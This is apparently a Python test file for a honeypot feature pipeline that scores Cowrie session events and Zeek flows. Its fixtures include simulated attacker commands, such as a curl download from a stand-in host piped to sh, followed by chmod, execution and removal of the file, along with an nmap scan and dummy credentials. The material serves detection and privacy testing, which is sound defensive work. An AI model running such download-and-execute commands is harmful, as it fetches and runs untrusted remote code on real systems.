from __future__ import annotations

import copy
import hashlib
import json
import unittest

from model2_unified_session_candidate_20260926.contract import (
    FEATURE_ORDER,
    FEATURE_SCHEMA_SHA256,
    LABEL_ORDER,
)
from model2_unified_session_candidate_20260926.pipeline import (
    FeatureContractError,
    extract_features,
    extract_or_unavailable,
)


IDENTITY = {
    "source_session_id": "source-session-a",
    "run_id": "run-a",
    "measurement_id": "measurement-a",
    "episode_id": "episode-a",
}
PCAP_SHA = "a" * 64
CONN_SHA = "b" * 64
COWRIE_SHA = "c" * 64


def event(seq, eventid, second, **fields):
    return {
        "source_event_key": f"event-{seq}",
        "source_sequence": seq,
        "session_id": IDENTITY["source_session_id"],
        "eventid": eventid,
        "timestamp": f"2026-09-26T00:00:{second:02d}Z",
        **fields,
    }


def episode():
    events = [
        event(1, "cowrie.session.connect", 0),
        event(2, "cowrie.login.failed", 1, username="admin", password="raw-auth-secret"),
        event(3, "cowrie.command.input", 2, input="nmap -sV 10.0.0.5"),
        event(
            4,
            "cowrie.command.input",
            3,
            input="curl -L -o /tmp/secret.bin --user admin:raw-command-secret https://mirror.example/private.bin?token=raw-token | sh",
        ),
        event(5, "cowrie.command.input", 4, input="chmod +x /tmp/secret.bin"),
        event(6, "cowrie.login.success", 5, username="ADMIN"),
        event(7, "cowrie.command.input", 6, input="sh /tmp/secret.bin"),
        event(8, "cowrie.command.input", 7, input="tar -xf /tmp/secret.bin"),
        event(9, "cowrie.command.input", 8, input="rm /tmp/secret.bin"),
        event(10, "cowrie.command.failed", 9, input="unknown-command"),
        event(11, "cowrie.session.closed", 10),
    ]
    flow = {
        "uid": "C1abc",
        "flow_binding": "PASS",
        "episode_binding": IDENTITY,
        "tuple": {
            "orig_h": "10.0.0.5",
            "orig_p": "40000",
            "resp_h": "198.51.100.8",
            "resp_p": "443",
            "proto": "tcp",
        },
        "duration": 4.0,
        "orig_bytes": 321.0,
        "resp_bytes": 4096.0,
        "conn_state": "SF",
    }
    return {
        "cowrie": {
            "identity": IDENTITY,
            "complete": True,
            "auth_telemetry_complete": True,
            "event_log_sha256": COWRIE_SHA,
            "events": events,
        },
        "network": {
            "identity": IDENTITY,
            "complete": True,
            "pcap": {"finalized": True, "drop_count": 0, "sha256": PCAP_SHA},
            "zeek": {
                "status": "COMPLETE",
                "pcap_sha256": PCAP_SHA,
                "conn_log_sha256": CONN_SHA,
                "identity": IDENTITY,
            },
            "flows": [flow],
        },
    }


class FeaturePipelineTests(unittest.TestCase):
    def extract(self, value=None):
        return extract_features(value or episode(), expected_identity=IDENTITY)

    def test_feature_order_matches_checked_in_schema(self):
        from pathlib import Path

        schema = Path(__file__).parents[1] / "FEATURE_SCHEMA.v1.json"
        parsed = json.loads(schema.read_text())
        self.assertEqual(tuple(parsed["feature_order"]), FEATURE_ORDER)
        self.assertEqual(parsed["output_order"], list(LABEL_ORDER))
        self.assertEqual(len(FEATURE_ORDER), 54)
        self.assertEqual(hashlib.sha256(schema.read_bytes()).hexdigest(), FEATURE_SCHEMA_SHA256)
        candidate_manifest = json.loads((schema.parent / "CANDIDATE_MANIFEST.v1.json").read_text())
        dataset_manifest = json.loads((schema.parent / "DATASET_MANIFEST.v1.json").read_text())
        self.assertEqual(candidate_manifest["feature_schema_sha256"], FEATURE_SCHEMA_SHA256)
        self.assertEqual(dataset_manifest["feature_schema_sha256"], FEATURE_SCHEMA_SHA256)
        self.assertEqual(hashlib.sha256(schema.read_bytes()).hexdigest(), __import__(
            "model2_unified_session_candidate_20260926.contract", fromlist=["FEATURE_SCHEMA_SHA256"]
        ).FEATURE_SCHEMA_SHA256)

    def test_extraction_is_deterministic_and_emits_one_unified_untrained_shape(self):
        result = self.extract()
        self.assertEqual(result["status"], "AVAILABLE")
        self.assertEqual(tuple(result["feature_order"]), FEATURE_ORDER)
        self.assertEqual(tuple(result["feature_vector"]), FEATURE_ORDER)
        self.assertEqual(tuple(result["outputs"]), LABEL_ORDER)
        self.assertTrue(all(v == self.extract()["feature_vector"][k] for k, v in result["feature_vector"].items()))
        self.assertTrue(all(item["status"] == "NOT_TRAINED" for item in result["outputs"].values()))

    def test_command_dedup_uses_stable_event_key_not_command_text(self):
        value = episode()
        duplicate = copy.deepcopy(value["cowrie"]["events"][3])
        value["cowrie"]["events"].append(duplicate)
        same_text_new_event = copy.deepcopy(value["cowrie"]["events"][3])
        same_text_new_event["source_event_key"] = "event-12"
        same_text_new_event["source_sequence"] = 12
        same_text_new_event["timestamp"] = "2026-09-26T00:00:09Z"
        value["cowrie"]["events"].append(same_text_new_event)
        next(item for item in value["cowrie"]["events"] if item["eventid"] == "cowrie.session.closed")["source_sequence"] = 13
        result = self.extract(value)
        self.assertEqual(result["feature_vector"]["command_event_count"], 7.0)
        self.assertEqual(result["feature_vector"]["transfer_tool_command_count"], 2.0)

    def test_same_timestamp_order_uses_source_sequence(self):
        value = episode()
        value["cowrie"]["events"][2]["timestamp"] = "2026-09-26T00:00:03Z"
        value["cowrie"]["events"][3]["timestamp"] = "2026-09-26T00:00:03Z"
        result = self.extract(value)
        self.assertEqual(result["feature_vector"]["discovery_before_transfer_count"], 1.0)

    def test_transfer_and_cross_ttp_sequence_signals_are_attempt_semantics_only(self):
        vector = self.extract()["feature_vector"]
        self.assertEqual(vector["transfer_curl_command_count"], 1.0)
        self.assertEqual(vector["transfer_https_scheme_count"], 1.0)
        self.assertEqual(vector["transfer_default_web_port_count"], 1.0)
        self.assertEqual(vector["transfer_output_intent_count"], 1.0)
        self.assertEqual(vector["transfer_redirect_requested_count"], 1.0)
        self.assertEqual(vector["transfer_pipe_to_shell_intent_count"], 1.0)
        self.assertEqual(vector["transfer_unique_destination_count"], 1.0)
        self.assertEqual(vector["transfer_before_execution_count"], 1.0)
        self.assertEqual(vector["transfer_before_permission_change_count"], 1.0)
        self.assertEqual(vector["transfer_before_archive_count"], 1.0)
        self.assertEqual(vector["transfer_before_cleanup_count"], 1.0)
        self.assertEqual(vector["network_established_connection_count"], 1.0)
        self.assertEqual(vector["network_resp_bytes_sum"], 4096.0)

    def test_transfer_cli_hard_negatives_and_case_sensitive_output_flags(self):
        value = episode()
        value["cowrie"]["events"] = [
            event(1, "cowrie.session.connect", 0),
            event(2, "cowrie.command.input", 2, input="wget --help"),
            event(3, "cowrie.command.input", 3, input="curl --version"),
            event(4, "cowrie.command.input", 4, input="wget"),
            event(5, "cowrie.command.input", 5, input="wget -o /tmp/wget.log https://mirror.example/file"),
            event(6, "cowrie.command.input", 6, input="wget -O /tmp/file https://mirror.example/file"),
            event(7, "cowrie.command.input", 7, input="curl -v --url=https://mirror.example/file"),
            event(8, "cowrie.session.closed", 9),
        ]
        vector = self.extract(value)["feature_vector"]
        self.assertEqual(vector["transfer_tool_command_count"], 3.0)
        self.assertEqual(vector["transfer_output_intent_count"], 1.0)

    def test_quoted_transfer_text_is_not_pipe_to_shell_intent(self):
        value = episode()
        value["cowrie"]["events"][3]["input"] = "echo 'curl https://example.invalid/a | sh'"
        vector = self.extract(value)["feature_vector"]
        self.assertEqual(vector["transfer_tool_command_count"], 0.0)
        self.assertEqual(vector["transfer_pipe_to_shell_intent_count"], 0.0)

    def test_auth_aggregates_and_raw_credentials_are_not_emitted(self):
        result = self.extract()
        vector = result["feature_vector"]
        self.assertEqual(vector["auth_attempt_count"], 2.0)
        self.assertEqual(vector["auth_failure_count"], 1.0)
        self.assertEqual(vector["auth_success_count"], 1.0)
        self.assertEqual(vector["auth_distinct_username_count"], 1.0)
        rendered = json.dumps(result, sort_keys=True)
        for secret in ("raw-auth-secret", "raw-command-secret", "raw-token", "mirror.example", "private.bin", "admin"):
            self.assertNotIn(secret, rendered)
        self.assertFalse(result["provenance"]["raw_command_or_username_retained"])

    def test_privacy_preserving_pi_projections_match_raw_feature_vector(self):
        baseline = self.extract()["feature_vector"]
        value = episode()
        families = {
            2: "discovery", 3: "transfer", 4: "permission",
            6: "execution", 7: "archive", 8: "cleanup",
        }
        for index, item in enumerate(value["cowrie"]["events"]):
            if item["eventid"] in {"cowrie.login.failed", "cowrie.login.success"}:
                item["username_sha256"] = hashlib.sha256(item.pop("username").casefold().encode()).hexdigest()
                item.pop("password", None)
            if item["eventid"] == "cowrie.command.input":
                projection = {"family": families[index]}
                if index == 3:
                    projection["transfer"] = {
                        "tool": "curl", "schemes": ["https"], "ports": ["default_web"],
                        "output": True, "redirect": True, "pipe_shell": True,
                        "destination_digests": [hashlib.sha256(b"mirror.example").hexdigest()],
                    }
                item["command_projection"] = projection
                item.pop("input", None)
        projected = self.extract(value)["feature_vector"]
        self.assertEqual(projected, baseline)
        self.assertNotIn("mirror.example", json.dumps(value, sort_keys=True))

    def test_outcome_event_and_http_log_metadata_do_not_change_features(self):
        baseline = self.extract()["feature_vector"]
        value = episode()
        value["cowrie"]["events"].append(
            {"eventid": "cowrie.session.file_download", "session_id": "other", "sha256": "secret"}
        )
        value["network"]["http_transactions"] = [
            {"status_code": 200, "response_body_len": 999999, "cookie": "secret"}
        ]
        self.assertEqual(baseline, self.extract(value)["feature_vector"])
        self.assertFalse(self.extract(value)["provenance"]["http_log_used"])

    def test_missing_network_or_pcap_is_unavailable_not_a_zero_vector(self):
        value = episode()
        value["network"]["complete"] = False
        result = extract_or_unavailable(value, expected_identity=IDENTITY)
        self.assertEqual(result["status"], "UNAVAILABLE")
        self.assertIsNone(result["feature_vector"])
        self.assertTrue(all(row["decision"] is None for row in result["outputs"].values()))

    def test_wrong_session_run_measurement_or_episode_fails_closed(self):
        for field in ("source_session_id", "run_id", "measurement_id", "episode_id"):
            value = episode()
            value["network"]["identity"] = {**IDENTITY, field: "wrong"}
            self.assertEqual(
                extract_or_unavailable(value, expected_identity=IDENTITY)["status"],
                "UNAVAILABLE",
            )

    def test_flow_tuple_uid_and_pcap_binding_are_required(self):
        value = episode()
        value["network"]["zeek"]["pcap_sha256"] = "d" * 64
        with self.assertRaisesRegex(FeatureContractError, "zeek_pcap_binding_mismatch"):
            self.extract(value)
        value = episode()
        value["network"]["flows"][0]["flow_binding"] = "FAIL"
        self.assertEqual(extract_or_unavailable(value, expected_identity=IDENTITY)["status"], "UNAVAILABLE")
        value = episode()
        value["network"]["flows"].append(copy.deepcopy(value["network"]["flows"][0]))
        with self.assertRaisesRegex(FeatureContractError, "zeek_uid_missing_or_duplicate"):
            self.extract(value)

    def test_unbound_background_flow_with_transfer_command_is_unavailable_not_negative(self):
        value = episode()
        value["network"]["flows"][0]["flow_binding"] = "FAIL"
        result = extract_or_unavailable(value, expected_identity=IDENTITY)
        self.assertEqual(result["status"], "UNAVAILABLE")
        self.assertIsNone(result["feature_vector"])
        self.assertTrue(all(item["decision"] is None for item in result["outputs"].values()))

    def test_duplicate_event_key_conflict_and_missing_order_fail_closed(self):
        value = episode()
        conflicting = copy.deepcopy(value["cowrie"]["events"][3])
        conflicting["input"] = "curl https://different.example/"
        value["cowrie"]["events"].append(conflicting)
        self.assertEqual(extract_or_unavailable(value, expected_identity=IDENTITY)["status"], "UNAVAILABLE")
        value = episode()
        del value["cowrie"]["events"][3]["source_sequence"]
        with self.assertRaisesRegex(FeatureContractError, "stable_source_sequence_missing"):
            self.extract(value)

    def test_empty_complete_session_has_structural_zero_not_missing_source(self):
        value = episode()
        value["cowrie"]["events"] = [
            event(1, "cowrie.session.connect", 0),
            event(2, "cowrie.session.closed", 9),
        ]
        value["network"]["flows"] = []
        vector = self.extract(value)["feature_vector"]
        self.assertEqual(vector["command_event_count"], 0.0)
        self.assertEqual(vector["network_connection_count"], 0.0)
        self.assertEqual(vector["auth_attempt_count"], 0.0)

    def test_partial_capture_and_nonfinite_values_fail_closed(self):
        value = episode()
        value["network"]["pcap"]["drop_count"] = 1
        self.assertEqual(extract_or_unavailable(value, expected_identity=IDENTITY)["status"], "UNAVAILABLE")
        value = episode()
        value["network"]["flows"][0]["resp_bytes"] = float("nan")
        self.assertEqual(extract_or_unavailable(value, expected_identity=IDENTITY)["status"], "UNAVAILABLE")


if __name__ == "__main__":
    unittest.main()
